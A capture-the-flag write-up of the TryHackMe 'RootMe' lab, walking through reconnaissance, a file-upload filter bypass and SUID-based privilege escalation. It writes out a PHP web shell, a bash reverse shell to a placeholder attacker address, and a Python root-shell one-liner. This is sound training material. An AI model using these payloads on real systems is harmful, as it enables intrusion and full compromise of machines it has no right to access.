# RootMe - Write-Up

## Room Information

| Field          | Value                                         |
| -------------- | --------------------------------------------- |
| Room           | RootMe                                        |
| Platform       | TryHackMe                                     |
| Difficulty     | Easy                                          |
| Date Completed | got no idea that was long time ago                                    |
| Tags           | Web, File Upload, Privilege Escalation, Linux |

---

# Objective

* Obtain initial access.
* Capture the user flag.
* Escalate privileges to root.
* Capture the root flag.

---

# Attack Path Summary

1. Perform reconnaissance.
2. Enumerate web services.
3. Discover vulnerable upload functionality.
4. Upload malicious payload.
5. Gain reverse shell.
6. Enumerate privilege escalation vectors.
7. Abuse SUID binary.
8. Obtain root access.

---

# Reconnaissance

## Host Discovery

```bash
ping -c 4 <TARGET_IP>
```

Confirm connectivity to the target.

---

## Nmap Scan

### Command

```bash
nmap -sC -sV -Pn -oN nmap.txt <TARGET_IP>
```

### Findings

| Port | Service | Version |
| ---- | ------- | ------- |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache  |

### Screenshot

![Nmap Scan](screenshots/01_nmap.png)

### Notes

The HTTP service appears to be the primary attack surface.

---

# Web Enumeration

## Manual Enumeration

Browse the website and inspect:

* Homepage
* Source code
* Robots.txt
* Hidden links
* Upload forms

---

## Directory Enumeration

### Command

```bash
gobuster dir \
-u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html
```

### Findings

| Path     | Description    |
| -------- | -------------- |
| /uploads | Uploaded files |
| /panel   | Upload panel   |

### Screenshot

![Gobuster](screenshots/02_gobuster.png)

### Notes

The upload panel becomes the primary focus.

---

# Vulnerability Analysis

## File Upload Functionality

The application allows file uploads.

Testing reveals restrictions on standard PHP files.

### Upload Tests

| Extension | Result  |
| --------- | ------- |
| .php      | Blocked |
| .php5     | Allowed |
| .txt      | Allowed |

### Observation

The server accepts alternative PHP extensions.

---

# Initial Access

## Web Shell Upload

### Payload

```php
<?php system($_GET['cmd']); ?>
```

Saved as:

```text
shell.php5
```

---

## Upload Payload

Upload the file through the panel.

---

## Command Execution

Test execution:

```text
http://<TARGET_IP>/uploads/shell.php5?cmd=id
```

Expected output:

```text
uid=...
```

---

## Reverse Shell

### Attacker Machine

```bash
nc -lvnp 4444
```

### Trigger Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

URL Encoded:

```text
http://<TARGET_IP>/uploads/shell.php5?cmd=<PAYLOAD>
```

---

## Shell Stabilization

### Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Background Shell

```bash
CTRL+Z
```

### Local Terminal

```bash
stty raw -echo
fg
```

### Fix Terminal

```bash
export TERM=xterm
```

---

# User Flag

## Locate Flag

```bash
find / -name user.txt 2>/dev/null
```

### Read Flag

```bash
cat /path/to/user.txt
```

### Screenshot

![User Flag](screenshots/03_user_flag.png)

---

# Local Enumeration

## System Information

```bash
uname -a
```

```bash
cat /etc/os-release
```

---

## Current User

```bash
id
```

---

## Sudo Permissions

```bash
sudo -l
```

---

## SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Findings

Interesting binary identified:

```text
/usr/bin/python
```

---

# Privilege Escalation

## Research

Check GTFOBins for the discovered binary.

Reference:

https://gtfobins.github.io

---

## Exploit

```bash
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

### Verification

```bash
id
```

Expected:

```text
uid=0(root)
```

---

# Root Flag

## Locate

```bash
find / -name root.txt 2>/dev/null
```

### Read

```bash
cat /root/root.txt
```

### Screenshot

![Root Flag](screenshots/04_root_flag.png)

---

# Lessons Learned

## Technical

* Directory enumeration is essential.
* File upload functionality must always be tested.
* Alternative PHP extensions may bypass filters.
* Reverse shells should be stabilized immediately.
* SUID binaries are common privilege escalation vectors.
* GTFOBins is invaluable during Linux privilege escalation.

## Methodology Improvements

* Enumerate manually before automated scans.
* Save command output whenever possible.
* Record attack decisions and observations.
* Maintain screenshots of key milestones.

---

# MITRE ATT&CK Mapping

| Phase                | Technique                         |
| -------------------- | --------------------------------- |
| Discovery            | Network Service Discovery         |
| Initial Access       | Exploit Public-Facing Application |
| Execution            | Command and Scripting Interpreter |
| Persistence          | N/A                               |
| Privilege Escalation | Abuse Elevation Control Mechanism |
| Collection           | Data from Local System            |

---

# Commands Reference

```bash
nmap -sC -sV -Pn <TARGET_IP>

gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

nc -lvnp 4444

python3 -c 'import pty; pty.spawn("/bin/bash")'

find / -perm -4000 -type f 2>/dev/null

sudo -l

id

uname -a
```

---

# Conclusion

Successfully achieved initial access through an unrestricted file upload vulnerability and escalated privileges through an insecure SUID configuration, resulting in full compromise of the target system.
